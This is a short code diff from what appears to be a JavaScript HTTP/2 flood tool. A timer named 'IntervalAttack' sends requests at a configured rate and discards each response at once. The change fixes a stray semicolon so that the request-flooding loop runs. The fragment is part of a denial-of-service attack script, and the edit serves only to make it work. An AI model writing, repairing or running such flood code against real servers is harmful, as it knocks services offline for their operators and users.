@@ -273,8 +273,8 @@ let bexnxx = {
          client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(bexnxx);
-					.on('response', response => {
+                    const request = client.request(bexnxx)
+	            .on('response', response => {
                         request.close();
                         request.destroy();
                         return
